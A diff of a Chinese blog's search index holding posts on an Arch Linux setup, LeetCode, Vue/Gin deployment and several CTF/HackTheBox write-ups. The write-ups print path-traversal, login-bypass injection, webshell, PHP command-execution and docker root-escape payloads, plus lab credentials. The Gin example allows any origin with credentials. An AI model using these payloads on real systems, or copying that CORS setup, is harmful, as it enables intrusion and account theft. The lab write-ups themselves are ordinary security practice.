+跟了我四年多的笔记本512G硬盘又双叒叕爆红了，又到了例行重装系统的时候了
+但是这一次我直接选择买一块硬盘，虽然是这价格涨到天际的时候，一块1T PCIE3gen4
+别问为什么是pcie3 因为是老电脑 1TB是因为没钱 请各位鸽鸽们打赏点吧
+于是打算干脆装个arch + niri + noctalia-shell
+反正网上说适配得不错了，一些软件的wayland水土不服也都有教程了
+最重要的是，我刷到了linux steam-proton 跑三角洲的教程，我又正好是劳steam服玩家（这里记住下面要考）
+ 安装arch
+无他唯手熟耳，由于我有多次安装经验，第一次装在物理机上也是一次成功
+教程[1]见下方参考文献
+
+此教程[1:1]有个小坑，单系统物理机安装时需要注意分区时加上grub分区，作者写在另一个页面了
+
+ 安装niri
+这里跟的教程[2]，但是也没有完全跟着走，因为这里面有一些小坑
+这里推荐把依赖都装好后直接在niri配置文件~/.config/niri/config.kdl里面加上
+1spawn-at-startup "qs" "-c" "noctalia-shell"
+然后启动niri，你就能正常使用了图形化了
+再根据noctalia-shell官方教程[3]配置属于自己的桌面环境
+ 死因
+根据B站和油管的相关视频配置三角洲，结果第一步就卒了
+根本打不开，翻评论区才发现，三角洲ACE升级了，添加了完整性检测，替换成卡拉比丘ACE的方法失效了
+如有大佬在linux上成功启动三角洲，请务必在评论区踢我
+ 总结
+如果你不玩游戏或只玩原生或已被proton支持且未被反作弊追杀的游戏（如永劫无间、CS2、LOL、MC等，瓦据说CachyOS做了反反作弊，可以看看是怎么实现的，也可以直接去用CachyOS，它是一个针对游戏进行了优化的Arch分支，也很推荐）
+那么非常推荐使用ArchLinux或其分支，并推荐niri+noctalia桌面，除游戏外各方面体验已经非常好了，也比较容易上手了
+ 图片展示
+
+被QQ压缩了，原图是很清晰的
+
+
+    [{"url":"/img/ba4d06c205eb3ca9ade48c1f6aa60aa7_720.png","alt":"niri展示","title":""},{"url":"/img/be5cc1c6e7d41f0a25f3cd23164a191a_720.png","alt":"edge in arch","title":""},{"url":"/img/1f9df7afbd8c47eae926cf91e1d101d3_720.png","alt":"winboat (lsw wsl翻版)","title":""},{"url":"/img/49733e36b12e83e5127ace51e46862c6_720.png","alt":"三角洲你怎么这么坏.jpg","title":""}]
+  
+ 参考文献
+
+
+
+archlinux简明指南 ↩︎ ↩︎
+
+Niri安装与配置 ↩︎
+
+Noctalia-shell ↩︎
+
+
+
+]]></content>
+      <categories>
+        <category>随笔</category>
+      </categories>
+      <tags>
+        <tag>linux</tag>
+        <tag>arch</tag>
+        <tag>wayland</tag>
+        <tag>niri</tag>
+        <tag>noctalia</tag>
+        <tag>shell</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>2024 长城杯铁人三项半决赛第二赛区 wp</title>
+    <url>/2024/05/awdwp/</url>
+    <content><![CDATA[(未整理完)
+ CFS
+ misc1
+备份文件泄露
+下载后是流量包
+流量包存在明文 flag
+（这里可能是非预期，预期是 aes 破解到 test 密码后，有个页面有个 flag）
+
+ misc2
+流量里还有一个 flag.zip
+导出后
+爆破得密码为 123456
+ web
+存在 rce 查看解析目录后 echo 一句话木马进去
+连接后 cat /flag 啥啥啥.txt
+flag get
+
+ AWD
+题目附件备份：
+php
+java1
+java2
+ php
+hook 流量发现一个 php 路径穿越
+/frontend/ajax/getfile?file=../../../../../../flag.txt
+修复：
+将/和.等用于路径穿越的字符过滤置空
+
+ java1
+一个 java
+/forget.jsp?cmd1=cat+/flag.txt
+修复 把 cmd1 字段改成复杂密码 使攻击者无法连接
+
+]]></content>
+      <categories>
+        <category>awd</category>
+      </categories>
+      <tags>
+        <tag>awd</tag>
+        <tag>长城杯</tag>
+        <tag>铁人三项</tag>
       </tags>
   </entry>
   <entry>
@@ -1959,106 +1931,6 @@ if roots:
       </tags>
   </entry>
   <entry>
-    <title>ctfshow黑盒测试</title>
-    <url>/2023/01/ctfshow%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95/</url>
-    <content><![CDATA[ web380
-先看源码没发现啥
-然后再点点看看功能
-发现文章页的格式为
-page_n.php
-猜测为 sql 注入
-直接在 n 处注入无效
-尝试?id=处注入
-发现报错
-file_get_contents(1'.php)
-
-直接读取 flag?id=flag
-flag 出现
- web381
-再次尝试上题思路，发现无回显
-再次翻看源码
-发现到 css 文件中出现了一个特殊地址
-
-尝试打开，之后回退文件地址
-直到退至/alsckdfy/出现 flag
-
-一些文件的调用可能会来自某些特殊的地址
-如本题中后台和前站共用同一个 css 文件
-其他如通过 cdn、图床等溯源回网上仓库（github 等）
-即可查到源码，或找到后台等特殊地址
-
- web382-383
-继续访问上题出现的后台地址
-发现出现了个后台登陆界面
-既然难度是梯度上升
-可以考虑弱密码或者万能密码
-进入
-flag get√
- web384
-
-hint:密码前 2 位是小写字母，后三位是数字
-
-再次进入后台登录页面
-用户名肯定是 admin
-然后就是爆破密码
-方法一：写个脚本生成密码字典
-方法二：使用 burp 爆破时
-将 password 设为两个变量
-
-$1 设置成小写字母长度：2
-
-$2 设置成 3 位数字
-
-password=xy123
- web385
-登陆界面进不去
-扫目录
-发现有 install 没删
-重置管理员密码
-
-
-一些网页模板的安装通常通过/install 目录进行安装
-部分开发人员忘记删除 install 等目录就会暴露出一些特殊的功能点
-如重置密码功能点
-模板名、版本号、配置信息等敏感信息
-
-重置后密码为 admin888
- web386
-再次访问 install 发现有个 lock.bat 给锁定住了
-
-最开始几道题是前端用了后端文件
-这题回去访问前端的同名文件 即本来应该调用的前端页面
-发现第一行注释
-
-访问 clear ：“清理成功”
-回想到，install 里的 lock，直接删
-clear.php?file=./install/lock.dat
-这次访问 install 能重置了
-
-返回后台登录初始账户
- 387
-发现 robots
-
-提示 debug，访问
-提示 file 不存在
-尝试 get 进去个 file
-
-
-使用 log 执行命令将 lock 删除
-&lt;?php unlink('/var/www/html/install/lock.dat')；?&gt;
-
-还有种执行方式是将命令通过读取文件显示回显
-&lt;?php system('==shell== &gt; /var/www/html/1.txt');?&gt;
-]]></content>
-      <categories>
-        <category>web</category>
-      </categories>
-      <tags>
-        <tag>web</tag>
-        <tag>ctfshow</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>ctfhub-rce</title>
     <url>/2022/04/ctfhub-rce/</url>
     <content><![CDATA[rce：远程代码执行漏洞
@@ -2202,6 +2074,106 @@ if (isset($_GET['ip']) &#x26;&#x26; $_GET['ip']) {
         <tag>web</tag>
         <tag>ctfhub</tag>
         <tag>rce</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>ctfshow黑盒测试</title>
+    <url>/2023/01/ctfshow%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95/</url>
+    <content><![CDATA[ web380
+先看源码没发现啥
+然后再点点看看功能
+发现文章页的格式为
+page_n.php
+猜测为 sql 注入
+直接在 n 处注入无效
+尝试?id=处注入
+发现报错
+file_get_contents(1'.php)
+
+直接读取 flag?id=flag
+flag 出现
+ web381
+再次尝试上题思路，发现无回显
+再次翻看源码
+发现到 css 文件中出现了一个特殊地址
+
+尝试打开，之后回退文件地址
+直到退至/alsckdfy/出现 flag
+
+一些文件的调用可能会来自某些特殊的地址
+如本题中后台和前站共用同一个 css 文件
+其他如通过 cdn、图床等溯源回网上仓库（github 等）
+即可查到源码，或找到后台等特殊地址
+
+ web382-383
+继续访问上题出现的后台地址
+发现出现了个后台登陆界面
+既然难度是梯度上升
+可以考虑弱密码或者万能密码
+进入
+flag get√
+ web384
+
+hint:密码前 2 位是小写字母，后三位是数字
+
+再次进入后台登录页面
+用户名肯定是 admin
+然后就是爆破密码
+方法一：写个脚本生成密码字典
+方法二：使用 burp 爆破时
+将 password 设为两个变量
+
+$1 设置成小写字母长度：2
+
+$2 设置成 3 位数字
+
+password=xy123
+ web385
+登陆界面进不去
+扫目录
+发现有 install 没删
+重置管理员密码
+
+
+一些网页模板的安装通常通过/install 目录进行安装
+部分开发人员忘记删除 install 等目录就会暴露出一些特殊的功能点
+如重置密码功能点
+模板名、版本号、配置信息等敏感信息
+
+重置后密码为 admin888
+ web386
+再次访问 install 发现有个 lock.bat 给锁定住了
+
+最开始几道题是前端用了后端文件
+这题回去访问前端的同名文件 即本来应该调用的前端页面
+发现第一行注释
+
+访问 clear ：“清理成功”
+回想到，install 里的 lock，直接删
+clear.php?file=./install/lock.dat
+这次访问 install 能重置了
+
+返回后台登录初始账户
+ 387
+发现 robots
+
+提示 debug，访问
+提示 file 不存在
+尝试 get 进去个 file
+
+
+使用 log 执行命令将 lock 删除
+&lt;?php unlink('/var/www/html/install/lock.dat')；?&gt;
+
+还有种执行方式是将命令通过读取文件显示回显
+&lt;?php system('==shell== &gt; /var/www/html/1.txt');?&gt;
+]]></content>
+      <categories>
+        <category>web</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+        <tag>ctfshow</tag>
       </tags>
   </entry>
   <entry>
@@ -2377,75 +2349,31 @@ su root 获取 root.txt
       </tags>
   </entry>
   <entry>
-    <title>htb-Shoppy</title>
-    <url>/2022/10/htb-Shoppy/</url>
+    <title>Visual Studio 2022界面美化教程</title>
+    <url>/2021/12/Visual%20Studio%202022%E7%95%8C%E9%9D%A2%E7%BE%8E%E5%8C%96%E6%95%99%E7%A8%8B/</url>
     <content><![CDATA[
-共做出三道题，前两道题 wp 正在补，但现在又有点想转去做 vulntarget
-
- Shoppy
- 信息收集
-老样子 先 nmap 扫下
-有 22 和 80
-
-然后将域名加入 hosts
-子域名扫描
-可以使用 gobuster 或各种 fuzz 工具如 wfuzz
-
-本来想用 oneforall 扫子域名，试了半天一堆错误，后来问学长，oneforall 是调用了一堆子域名解析的
-
-扫到 mattermost.shoppy.htb 加进 hosts
-打开发现是个登陆界面，先放着
-跑下主站的域名 发现有个/admin
- 登录
-根据黑盒测试老套路，试试弱口令，不成功，试试万能密码跑下
-发现admin'||''==='成功进入
-进入后发现搜索框，可进行大量尝试
-当搜索到 admin 后出现 passwordhash
-继续尝试后发现搜索admin'||''==='会出现两个 hash
-使用 hashcat 爆破
-josh:remembermethisway
-然后进入之前扫到的那个子域名尝试登陆，成功
-又是 htb 经典频道页面
-翻找后发现
-
-尝试使用 ssh 连接
-password:Sh0ppyBest@pp!
-
-user get√
- root
-ssh 进入后 ls 发现已经有老哥把经典 linepeas 传进去了
-开跑！
-然后爆出一堆 cve 先放一边
-还在后面看到一些 password 字段的文件去看看
+我之前用的是 2019 版本，后来有出新版我也没管，直到前几天他给我推送 2022 版了，查了下大部分都是好评（bug 恐惧症和恋旧），于是我决定入 2022 版了，但又怕我在 2019 调好的设置用不到 2022 上，于是暂时让两个版本共存，等 2022 调试好了再说 2019 的事。
+这是我在 2019 上美化用到的插件和设置（因为网上类似的不少，但 2022 版貌似没有人发过，所以我决定写这篇文章）
+不出所料，2022 版好多东西更新，导致一些东西不能用了，导入 2019 版甚至文件的时候，有一部分报错了，要不然就是改名了，要不然就是更新换代了，没大有影响，以萌新目前来看，是往好的方向发展了。
+但是我的那些美化插件直接搜名字的话是找不到了，于是我就在那找替代品，就找到了这两个插件。
+第一个插件，是 2019 版变的，变了样之后差点给我整不会了，它是类似于编程。
+新建项目 C#里面最后一项
 
 
-password:Sample
-调用下密码管理器
+创建之后，把 2019 版的该插件里的美化设置导出，然后重命名为 CustomTheme.vstheme
+然后复制到你新创建的 2022 版那个项目里，选择替换更新，之后项目文件夹里.sln 后缀的那个文件打开，选择你之前那个配置的名字，然后运行，不管他蹦出来啥弹窗，等他一打开接着关了就好，之后重启 visualstudio 就可以了
 
-再次使用 ssh 登录 deploy 账户
-进入后又没啥思路了
-准备走 cve 了
-走前看了眼 wp
-发现聊天页下面还有段话
+这个插件是为后面设置背景图片准备
+第二个插件我原来用的是 moeIDE，但是 2022 版它不支持了，所以就用新插件代替了。
 
-发现 docker 部署尝试 docker 提权
-1docker run -v /:/mnt --rm -it alpine chroot /mnt sh
+背景图是 B 站 1024 节发布的一张壁纸，我用 ps 调了下对比度，让他更鲜艳一些
 
-其实后来想想 linpeas 里出现了提示
-
-deplay 在 root 权限的 docker 组里，当时要是细看的话应该也能想到
-后面跟着 wp 做 cve 也懒得去试了
-最后给师傅们留下截图
-
-这回 cve 都没用，给个简单低评吧~
 ]]></content>
       <categories>
-        <category>htb</category>
+        <category>教程</category>
       </categories>
       <tags>
-        <tag>web</tag>
-        <tag>HackTheBox</tag>
-        <tag>htb-Shoppy</tag>
+        <tag>visual studio 2022</tag>
       </tags>
   </entry>
   <entry>
@@ -2554,6 +2482,131 @@ print(token + "." + sig)
       </tags>
   </entry>
   <entry>
+    <title>htb-Shoppy</title>
+    <url>/2022/10/htb-Shoppy/</url>
+    <content><![CDATA[
+共做出三道题，前两道题 wp 正在补，但现在又有点想转去做 vulntarget
+
+ Shoppy
+ 信息收集
+老样子 先 nmap 扫下
+有 22 和 80
+
+然后将域名加入 hosts
+子域名扫描
+可以使用 gobuster 或各种 fuzz 工具如 wfuzz
+
+本来想用 oneforall 扫子域名，试了半天一堆错误，后来问学长，oneforall 是调用了一堆子域名解析的
+
+扫到 mattermost.shoppy.htb 加进 hosts
+打开发现是个登陆界面，先放着
+跑下主站的域名 发现有个/admin
+ 登录
+根据黑盒测试老套路，试试弱口令，不成功，试试万能密码跑下
+发现admin'||''==='成功进入
+进入后发现搜索框，可进行大量尝试
+当搜索到 admin 后出现 passwordhash
+继续尝试后发现搜索admin'||''==='会出现两个 hash
+使用 hashcat 爆破
+josh:remembermethisway
+然后进入之前扫到的那个子域名尝试登陆，成功
+又是 htb 经典频道页面
+翻找后发现
+
+尝试使用 ssh 连接
+password:Sh0ppyBest@pp!
+
+user get√
+ root
+ssh 进入后 ls 发现已经有老哥把经典 linepeas 传进去了
+开跑！
+然后爆出一堆 cve 先放一边
+还在后面看到一些 password 字段的文件去看看
+
+
+password:Sample
+调用下密码管理器
+
+再次使用 ssh 登录 deploy 账户
+进入后又没啥思路了
+准备走 cve 了
+走前看了眼 wp
+发现聊天页下面还有段话
+
+发现 docker 部署尝试 docker 提权
+1docker run -v /:/mnt --rm -it alpine chroot /mnt sh
+
+其实后来想想 linpeas 里出现了提示
+
+deplay 在 root 权限的 docker 组里，当时要是细看的话应该也能想到
+后面跟着 wp 做 cve 也懒得去试了
+最后给师傅们留下截图
+
+这回 cve 都没用，给个简单低评吧~
+]]></content>
+      <categories>
+        <category>htb</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+        <tag>HackTheBox</tag>
+        <tag>htb-Shoppy</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>力扣 394.字符串解码 特殊解</title>
+    <url>/2025/02/leetcode%20394/</url>
+    <content><![CDATA[394.字符串解码
+
+一种独创的 不用辅助栈的解(笑)
+
+
+ 思路
+不用栈 遍历字符串转 python 表达式 eval 直出
+ 解题过程
+对于 python，我们可用 eval 函数将一串字符串当作 python 语句直接执行
+那么对于四个例子我们可以转换成代码中注释部分的表达式
+1234eval('3*("a") + 2*("bc")')
+eval('3*("a"+2*("c"))')
+eval('2*("abc")+3*("cd")+"ef"')
+eval('"abc"+3*("cd")+"xyz"')
+ 复杂度
+
+时间复杂度: O(n)
+空间复杂度: O(n)
+
+ Code
+12345678910111213141516171819202122class Solution:
+    def decodeString(self, s: str) -> str:
+        func = '' # 用于存表达式
+        for i in range(len(s)):
+            if s[i].isdigit():
+                if i > 0 and not s[i - 1].isdigit():
+                    func += "+"
+                func += s[i]
+            elif s[i] == "[":
+                func += "*("
+            elif s[i] == "]":
+                func += ")"
+                if i &#x3C; len(s) - 1 and s[i + 1] != "]" and not s[i + 1].isdigit():
+                    func += "+"
+            else:
+                if i == 0 or not s[i - 1].isalpha():
+                    func += '"'
+                func += s[i]
+                if i == len(s) - 1 or not s[i + 1].isalpha():
+                    func += '"'
+        print(func)
+        return eval(func)]]></content>
+      <categories>
+        <category>算法</category>
+      </categories>
+      <tags>
+        <tag>leetcode</tag>
+        <tag>算法</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>linux动态加载</title>
     <url>/2022/05/linux%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/</url>
     <content><![CDATA[ linux 动态加载
@@ -2611,59 +2664,6 @@ get
         <tag>ctfhub</tag>
         <tag>linux</tag>
         <tag>动态加载</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>力扣 394.字符串解码 特殊解</title>
-    <url>/2025/02/leetcode%20394/</url>
-    <content><![CDATA[394.字符串解码
-
-一种独创的 不用辅助栈的解(笑)
-
-
- 思路
-不用栈 遍历字符串转 python 表达式 eval 直出
- 解题过程
-对于 python，我们可用 eval 函数将一串字符串当作 python 语句直接执行
-那么对于四个例子我们可以转换成代码中注释部分的表达式
-1234eval('3*("a") + 2*("bc")')
-eval('3*("a"+2*("c"))')
-eval('2*("abc")+3*("cd")+"ef"')
-eval('"abc"+3*("cd")+"xyz"')
- 复杂度
-
-时间复杂度: O(n)
-空间复杂度: O(n)
-
- Code
-12345678910111213141516171819202122class Solution:
-    def decodeString(self, s: str) -> str:
-        func = '' # 用于存表达式
-        for i in range(len(s)):
-            if s[i].isdigit():
-                if i > 0 and not s[i - 1].isdigit():
-                    func += "+"
-                func += s[i]
-            elif s[i] == "[":
-                func += "*("
-            elif s[i] == "]":
-                func += ")"
-                if i &#x3C; len(s) - 1 and s[i + 1] != "]" and not s[i + 1].isdigit():
-                    func += "+"
-            else:
-                if i == 0 or not s[i - 1].isalpha():
-                    func += '"'
-                func += s[i]
-                if i == len(s) - 1 or not s[i + 1].isalpha():
-                    func += '"'
-        print(func)
-        return eval(func)]]></content>
-      <categories>
-        <category>算法</category>
-      </categories>
-      <tags>
-        <tag>leetcode</tag>
-        <tag>算法</tag>
       </tags>
   </entry>
   <entry>
@@ -3449,6 +3449,106 @@ if(!isset($_POST['answer_key'])){
       </tags>
   </entry>
   <entry>
+    <title>vue gin合并部署(完美方案)</title>
+    <url>/2024/12/vue%20gin%E5%90%88%E5%B9%B6%E9%83%A8%E7%BD%B2/</url>
+    <content><![CDATA[ 简介
+目前 vue 与 gin 的项目基本都是前后端分离部署
+二者合并部署的教程非常少，且各有各的问题
+结合各个教程后 找到一种比较完美的合并部署方案
+ vue
+使用 axios 时进行如下配置
+12345const request = axios.create({
+  baseURL: `${currentDomain}/api`,
+  timeout: 5000,
+  headers: { "Cache-Control": "no-cache" },
+});
+对 baseURL 进行设置是为了能够使用户请求时，前后端的域名端口完全一致，避免造成跨域（必须）
+并且对于非域名部署的情况，能够方便地动态调整，避免写死 baseURL
+headers 的设置是为了 vue dev 环境下，前后端的联调
+同时
+为了 dev 联调避免出现跨域问题，还应添加代理
+1234567891011121314export default defineConfig({
+  // 其他参数
+  server: {
+    // port: 8080,
+    // open: true,
+    proxy: {
+      "/api": {
+        target: "http://localhost:5731",
+        changeOrigin: true,
+        // rewrite: (path) => path.replace(/^\/api/, ""), // 移除 /api 前缀 根据前后端代码 自行修改
+      },
+    },
+  },
+});
+额外配置 build 后任务，将构建好的 dist 复制到后端目录下
+12345"scripts": {
+    "dev": "vite",
+    "build": "vite build &#x26;&#x26; robocopy ./dist 后端路径/vue /e /z /r:0",
+    "preview": "vite preview"
+  },
+方便一部送到位
+ gin
+12345678❯ tree
+文件夹 PATH 列表
+卷序列号为 AE05-588D
+C:.
+├─main.go
+├─其他
+└─vue /* 可改 */
+    └─assets
+main.go 添加 embed 和路由
+12345678910111213141516171819202122232425262728//go:embed  vue/index.html
+var indexHtml []byte
+
+//go:embed  vue/*
+var vue embed.FS
+
+func main() {
+	// 其他设置
+
+    // 配置允许跨域 方便dev联调
+	r.Use(cors.New(cors.Config{
+		AllowOrigins:     []string{"*"}, // 允许的域名
+		AllowMethods:     []string{"GET", "POST", "PUT", "DELETE"},
+		AllowHeaders:     []string{"Origin", "Content-Type", "Authorization", "Cache-Control"},
+		AllowCredentials: true,
+	}))
+
+	// 配置vue路由
+	assets, _ := fs.Sub(vue, "vue/assets")
+	r.StaticFS("/assets", http.FS(assets))
+	icon, _ := fs.ReadFile(vue, "vue/favicon.ico")
+	r.GET("/favicon.ico", func(c *gin.Context) { c.Data(200, "image/x-icon", icon) })
+	r.NoRoute(func(c *gin.Context) {
+		c.Data(200, "text/html; charset=utf-8", indexHtml)
+	})
+
+    // 其他路由
+}
+使用r.NoRoute将非后端路由全部导向 index.html，并由 index.html 获取 css、js 等
+vue 中设置的 router 会被 build 进 js
+通过 js 获取 url 来切换页面
+对未使用 embed 的方法同理，参考代码自行设置
+ embed
+对于使用embed的
+由于StaticFS和embed的底层代码逻辑
+
+在前端根目录的文件一般不多，这里只有index.html和 icon 文件
+
+可通过单独获取、或通过fs.ReadFile获取，分别参考index.html和favicon.ico
+对于前端其他文件，需要通过fs.Sub下移到对应目录后才能通过r.StaticFS(&quot;/assets&quot;, http.FS(assets))配置路由，且前端文件夹名和后端路由必须相同，二者缺一不可，否则会出现空白页面，即请求 js 等文件不存在的，页面无法加载等情况
+]]></content>
+      <categories>
+        <category>教程</category>
+      </categories>
+      <tags>
+        <tag>vue</tag>
+        <tag>gin</tag>
+        <tag>golang</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>upload-labs</title>
     <url>/2022/03/upload-labs/</url>
     <content><![CDATA[ pass-01
@@ -3984,106 +4084,6 @@ Content-Disposition: form-data; name="submit"
         <tag>web</tag>
         <tag>upload</tag>
         <tag>upload-labs</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>vue gin合并部署(完美方案)</title>
-    <url>/2024/12/vue%20gin%E5%90%88%E5%B9%B6%E9%83%A8%E7%BD%B2/</url>
-    <content><![CDATA[ 简介
-目前 vue 与 gin 的项目基本都是前后端分离部署
-二者合并部署的教程非常少，且各有各的问题
-结合各个教程后 找到一种比较完美的合并部署方案
- vue
-使用 axios 时进行如下配置
-12345const request = axios.create({
-  baseURL: `${currentDomain}/api`,
-  timeout: 5000,
-  headers: { "Cache-Control": "no-cache" },
-});
-对 baseURL 进行设置是为了能够使用户请求时，前后端的域名端口完全一致，避免造成跨域（必须）
-并且对于非域名部署的情况，能够方便地动态调整，避免写死 baseURL
-headers 的设置是为了 vue dev 环境下，前后端的联调
-同时
-为了 dev 联调避免出现跨域问题，还应添加代理
-1234567891011121314export default defineConfig({
-  // 其他参数
-  server: {
-    // port: 8080,
-    // open: true,
-    proxy: {
-      "/api": {
-        target: "http://localhost:5731",
-        changeOrigin: true,
-        // rewrite: (path) => path.replace(/^\/api/, ""), // 移除 /api 前缀 根据前后端代码 自行修改
-      },
-    },
-  },
-});
-额外配置 build 后任务，将构建好的 dist 复制到后端目录下
-12345"scripts": {
-    "dev": "vite",
-    "build": "vite build &#x26;&#x26; robocopy ./dist 后端路径/vue /e /z /r:0",
-    "preview": "vite preview"
-  },
-方便一部送到位
- gin
-12345678❯ tree
-文件夹 PATH 列表
-卷序列号为 AE05-588D
-C:.
-├─main.go
-├─其他
-└─vue /* 可改 */
-    └─assets
-main.go 添加 embed 和路由
-12345678910111213141516171819202122232425262728//go:embed  vue/index.html
-var indexHtml []byte
-
-//go:embed  vue/*
-var vue embed.FS
-
-func main() {
-	// 其他设置
-
-    // 配置允许跨域 方便dev联调
-	r.Use(cors.New(cors.Config{
-		AllowOrigins:     []string{"*"}, // 允许的域名
-		AllowMethods:     []string{"GET", "POST", "PUT", "DELETE"},
-		AllowHeaders:     []string{"Origin", "Content-Type", "Authorization", "Cache-Control"},
-		AllowCredentials: true,
-	}))
-
-	// 配置vue路由
-	assets, _ := fs.Sub(vue, "vue/assets")
-	r.StaticFS("/assets", http.FS(assets))
-	icon, _ := fs.ReadFile(vue, "vue/favicon.ico")
-	r.GET("/favicon.ico", func(c *gin.Context) { c.Data(200, "image/x-icon", icon) })
-	r.NoRoute(func(c *gin.Context) {
-		c.Data(200, "text/html; charset=utf-8", indexHtml)
-	})
-
-    // 其他路由
-}
-使用r.NoRoute将非后端路由全部导向 index.html，并由 index.html 获取 css、js 等
-vue 中设置的 router 会被 build 进 js
-通过 js 获取 url 来切换页面
-对未使用 embed 的方法同理，参考代码自行设置
- embed
-对于使用embed的
-由于StaticFS和embed的底层代码逻辑
-
-在前端根目录的文件一般不多，这里只有index.html和 icon 文件
-
-可通过单独获取、或通过fs.ReadFile获取，分别参考index.html和favicon.ico
-对于前端其他文件，需要通过fs.Sub下移到对应目录后才能通过r.StaticFS(&quot;/assets&quot;, http.FS(assets))配置路由，且前端文件夹名和后端路由必须相同，二者缺一不可，否则会出现空白页面，即请求 js 等文件不存在的，页面无法加载等情况
-]]></content>
-      <categories>
-        <category>教程</category>
-      </categories>
-      <tags>
-        <tag>vue</tag>
-        <tag>gin</tag>
-        <tag>golang</tag>
       </tags>
   </entry>
   <entry>
